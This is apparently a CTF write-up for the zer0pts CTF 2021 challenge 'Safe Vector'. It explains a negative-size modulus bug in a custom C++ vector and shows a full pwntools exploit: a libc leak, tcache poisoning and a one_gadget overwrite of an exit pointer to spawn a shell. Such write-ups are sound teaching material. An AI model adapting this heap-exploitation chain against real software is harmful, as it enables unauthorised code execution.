---
title: Safe Vector - zer0pts CTF 2021
date: 2021-03-07 12:00:00
tags:
  - Linux
  - Exploitation
  - Heap
---

This was a really cool ctf, and we managed to solve 4 out of the 8 pwn challenges. Here's my writeup for safe vector - for which we got a top-10 solve.

![Safe Vector](https://i.imgur.com/uOENooT.png)

**tl;dr**
Faulty vector implementation, negative size and modulus function allows OOB r/w

## Initial analysis
The binary provided was a 64-bit one, and the author was kind enough to provide us with the CPP source code. The mitigations enabled were as follows:
```text
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```
Also, the provided libc was glibc 2.31.

The challenge implemented a custom vector, which allowed 5 options, namely `push`, `pop`, `store`, `load` and `wipe`.
`push` pushed a value into the vector and incremented the size, `pop` decremented the size, `store` allowed us to write a value into a particular index, and `load` allowed us to read a value at an index, and `wipe` erased all the contents of the vector and reset the size to 0.

## Reversing & Vulnerability

The vector had a custom indexing operation, which returned the element at `index % size`, so even if we give an out-of-bounds index to `store` or `load`, it would still return an element within the vector.

```cpp
template<typename T>
class safe_vector: public std::vector<T> {
public:
    void wipe() {
        std::vector<T>::resize(0);
        std::vector<T>::shrink_to_fit();
    }

    T& operator[](int index) {
        int size = std::vector<T>::size();
        if (size == 0) {
            throw "index out of bounds";
        }
        return std::vector<T>::operator[](index % size);
    }
};
```

The `push` option pushed a value into the vector, incrementing the size, and `pop` decremented the size of the array. However there was no check for whether the size was already 0, so we could continue to `pop` even after the size was 0, making it negative. 

Now, the `store` and `load` options allowed us to read and write at a particular index respectively, but what happens when the size is negative? If the size is negative, and the index we enter is also negative, we can view or write data at an out-of-bounds index, due to the modulus function `index % size`!

## Exploitation
Now that there's an obvious bug, it was pretty simple to exploit this. My method was to first abuse the vector `realloc`, which allocated a chunk, then if the size exceeded that of the allocated size, it would free that chunk and allocate another chunk of double the size, and so on (I learnt this just by observing the heap in gdb). This vector allocated a size of `0x20` to start (`malloc(0x10)`), then `0x30`, and so forth. For some reason it seems to allocate two `0x20` chunks initially (no idea why), but we could use this for tcache poisoning.

I abused this by `push`ing, thus increasing the size of the vector, until the size of the previous freed chunk became > `0x410` (greater than max tcache size, so it would go into unsorted bin). Then we could `pop` to a certain negative size to get an out-of-bounds read, and hence be able to leak libc from the unsorted bin fd pointer (pointer to main arena in libc). Following this, we could just `wipe` the vector, and then overwrite tcache fd of `0x20` size to an exit pointer, and get allocation there, and overwrite it with a `one_gadget` (one_gadgets didn't work on malloc hook or free hook). Following this, when the exit pointer is called, we get a shell!  

## Exploit script

```python
#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn.ctf.zer0pts.com', 9001
binary = './challmod'
brkpts = '''
b malloc
b execve
'''

elf = ELF("chall")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> ", str(idx))

def push(val):
    choice(1)
    sla("value: ", str(val))

def pop():
    choice(2)

def store(idx, val):
    choice(3)
    sla("index: ", str(idx))
    sla("value: ", str(val))

def leak(idx):
    choice(4)
    sla("index: ", str(idx))

def wipe():
    choice(5)

def getupper(val):
    return val >> 32

def getlower(val):
    return val & 0xffffffff

if __name__ == "__main__":
    for i in range(0x205):
        push(i)
    for i in range(0x205*2):
        pop()
    leak(-1030)
    reu("value: ")
    val = int(rl().strip()) << 32
    leak(-1031)
    reu("value: ")
    val += int(rl().strip())
    libc.address = val - 0x1ebbe0
    log.info("Libc : "+hex(libc.address))
    exitp = libc.address + 0x1ed500
    gadget = libc.address + [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6e73, 0xe6e76][1]
    wipe()
    for i in range(5):
        push(i)
    for i in range(25):
        pop()
    store(-16, getlower(exitp))
    store(-15, getupper(exitp))
    wipe()
    push(getlower(gadget))
    push(getupper(gadget))
    sl('cat flag*')

    io.interactive()
```